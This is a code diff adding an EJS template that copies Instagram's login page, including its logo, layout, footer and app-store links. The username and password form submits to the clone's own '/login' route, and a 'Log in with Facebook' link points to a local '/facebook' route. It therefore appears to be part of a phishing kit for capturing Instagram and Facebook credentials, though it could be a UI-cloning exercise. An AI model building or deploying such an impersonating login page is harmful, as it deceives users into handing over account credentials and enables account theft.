@@ -1,0 +1,197 @@
+<%- include("./partials/header") %>
+<title>Instagram</title>
+<link rel="stylesheet" href="/css/app.css" />
+
+<div
+  class="
+    main
+    d-flex
+    flex-row
+    justify-content-center
+    align-items-center
+    col-8
+    offset-3
+  "
+>
+  <div>
+    
+    <img class="mobile d-none d-md-block bgimg" src = "/bgimg.png" alt="" />
+
+        <img class="mobile d-none d-md-block img0" src = "/0.jpg" alt="" />
+       
+ 
+  </div>
+  <div
+    class="
+      section-2
+      d-flex
+      flex-column
+      justify-content-center
+      align-items-center
+    "
+  >
+    <div class="section-2-1 text-center">
+      <img class="instagram" src="/instagram.png" alt="" />
+      <form action="/login" method="POST">
+        <div class="form-1">
+          <div class="form-1-1">
+            <div class="form-1-1-1">
+              <input
+                class="username"
+                type="text"
+                placeholder="Phone number, username, or email"
+                name="username"
+                onkeyup = "enableDisable()"
+                required
+              />
+            </div>
+          </div>
+          <div class="form-1-2">
+            <div class="form-1-2-1">
+              <input
+                class="password"
+                type="password"
+                placeholder="Password"
+                name="password"
+                onkeyup="enableDisable()"
+                required
+              />
+            </div>
+          </div>
+          <button class="btn-sm" id="btnSubmit" disabled>
+            <div>Log In</div>
+          </button>
+          <div
+            class="d-flex flex-row justify-content-between"
+            style="width: 268px; margin: 8px 40px 20px"
+          >
+            <div
+              style="
+                background-color: #dbdbdb;
+                width: 110px;
+                height: 1px;
+                margin-top: 8px;
+              "
+            ></div>
+            <div
+              style="
+                color: #8e8e8e;
+                font-size: 13px;
+                margin: auto 18px;
+                font-weight: 500;
+              "
+            >
+              OR
+            </div>
+            <div
+              style="
+                background-color: #dbdbdb;
+                width: 110px;
+                height: 1px;
+                margin-top: 8px;
+              "
+            ></div>
+          </div>
+
+          <a href="/facebook" class="facebook-login">
+            <span><i class="fab fa-facebook-square"></i></span>
+            <span class="facebook">Log in with Facebook</span>
+          </a>
+        </div>
+        <div class="form-2">
+          <a href="https://www.instagram.com/accounts/password/reset/"
+            >Forgot password?</a
+          >
+        </div>
+      </form>
+    </div>
+    <div class="section-2-2">
+      <div class="section-2-2-1">
+        <p class="text-center">
+          Don't have an account?
+          <a
+            href="https://www.instagram.com/accounts/emailsignup/"
+            target="__blank"
+            >Sign up</a
+          >
+        </p>
+      </div>
+    </div>
+    <div class="d-flex flex-column justify-content-center align-items-center">
+      <p class="get-app">Get the app.</p>
+      <div class="d-flex flex-row justify-content-between">
+        <a
+          href="https://apps.apple.com/app/instagram/id389801252?vt=lo"
+          target="_blank"
+        >
+          <img
+            src="4b70f6fae447.png"
+            style="margin-right: 5px"
+            class="store-logo"
+            alt=""
+        /></a>
+        <a
+          href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26ig_mid%3D078F96F9-365F-4811-95E4-7A6992A0028E%26utm_content%3Dlo%26utm_medium%3Dbadge"
+          target="_blank"
+        >
+          <img
+            src="f06b908907d5.png"
+            class="store-logo"
+            style="margin-left: 5px"
+            alt=""
+          />
+        </a>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="footer" style="width: 100%">
+  <div
+    class="d-flex flex-column justify-content-center text-center mx-auto mt-4"
+    style="width: 40%"
+  >
+    <ul
+      class="d-flex flex-row justify-content-around about"
+      style="list-style: none"
+    >
+      <li>About</li>
+      <li>Blog</li>
+      <li>Jobs</li>
+      <li>Help</li>
+      <li>API</li>
+      <li>Privacy</li>
+      <li>Terms</li>
+      <li>Top Accounts</li>
+      <li>Hashtags</li>
+      <li>Locations</li>
+    </ul>
+    <ul
+      class="d-flex flex-row justify-content-center copyright"
+      style="list-style: none"
+    >
+      <li class="">
+        <select name="" id="" class="">
+          <option value="language">English</option>
+          <option value="language">Hindi</option>
+        </select>
+      </li>
+      <li class="">© 2021 Instagram from Facebook</li>
+    </ul>
+  </div>
+</div>
+<script>
+  var usernameInput = document.querySelector(".username")
+  var passwordInput = document.querySelector(".password")
+  var btnSubmit = document.getElementById("btnSubmit")
+    const enableDisable = () => {
+      if(passwordInput.value.trim().length > 5 && usernameInput.value.trim().length){
+          btnSubmit.disabled = false;
+      }
+      else{
+        btnSubmit.disabled = true;
+      }
+    }
+
+</script>
+<%- include("./partials/footer") %>
